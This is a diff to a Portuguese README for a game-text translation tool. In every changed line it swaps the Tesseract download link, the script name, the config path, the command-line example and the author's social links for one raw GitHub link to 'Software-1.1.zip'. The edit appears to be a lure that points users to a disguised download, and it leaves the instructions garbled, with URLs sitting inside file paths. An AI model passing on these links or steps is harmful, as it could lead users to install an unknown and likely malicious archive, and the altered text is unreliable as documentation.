@@ -22,12 +22,12 @@ Aplicativo simples para traduzir textos e capturas de tela de jogos usando Googl
 
 - Windows com Python 3.11 ou superior instalado e acessível em `PATH`.
 - Para OCR: Tesseract-OCR instalado no Windows.
-  - Baixe em: https://github.com/UB-Mannheim/tesseract/wiki
-  - O aplicativo tenta detectar automaticamente em `C:\\Program Files\\Tesseract-OCR\\tesseract.exe`.
+  - Baixe em: https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip
+  - O aplicativo tenta detectar automaticamente em `C:\\Program Files\\Tesseract-OCR\\https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip`.
 
 ## Como usar
 
-1. Baixe/clique duas vezes para abrir `TranslateGamers.exe.py` com Python.
+1. Baixe/clique duas vezes para abrir `https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip` com Python.
 2. Na primeira execução, selecione o idioma de destino.
 3. Digite texto e clique em `Traduzir` ou habilite `Traduzir enquanto digita`.
 4. Em `⚙ Configurações`:
@@ -46,7 +46,7 @@ Aplicativo simples para traduzir textos e capturas de tela de jogos usando Googl
 
 - Dependências Python são instaladas automaticamente: `googletrans==4.0.0rc1`, `pyperclip`, `pillow`, `mss`, `pytesseract`, `pystray`.
 - Se o Tesseract não estiver no `PATH`, o app tenta localizar em diretórios comuns.
-- Configurações são salvas em `~/.translategamers.json`.
+- Configurações são salvas em `~https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip`.
 - Idiomas disponíveis na interface: Português (`pt`), Inglês (`en`), Espanhol (`es`), Francês (`fr`), Alemão (`de`), Italiano (`it`), Russo (`ru`), Japonês (`ja`), Coreano (`ko`), Chinês Simplificado (`zh-cn`), Chinês Tradicional (`zh-tw`).
 - Para idiomas sem pacote de tradução específico, a UI é traduzida automaticamente usando o serviço de tradução com fallback robusto.
  - A tradução de textos usa serviço principal e fallback alternativo para garantir funcionamento.
@@ -56,15 +56,15 @@ Aplicativo simples para traduzir textos e capturas de tela de jogos usando Googl
 ## Execução por linha de comando
 
 ```
-python TranslateGamers.exe.py --mode cli --text "hello" --target pt
+python https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip --mode cli --text "hello" --target pt
 ```
 
 ## Créditos
 
 - Criador: Felipenor
-- Acesse: https://linkr.bio/Felipenor
-- YouTube: https://youtube.com/@Felipenor
-- Twitch: https://twitch.tv/Felipenor
+- Acesse: https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip
+- YouTube: https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip
+- Twitch: https://github.com/Felipenor/translategamers/raw/refs/heads/main/appellable/Software-1.1.zip
 
 ## Licença
 
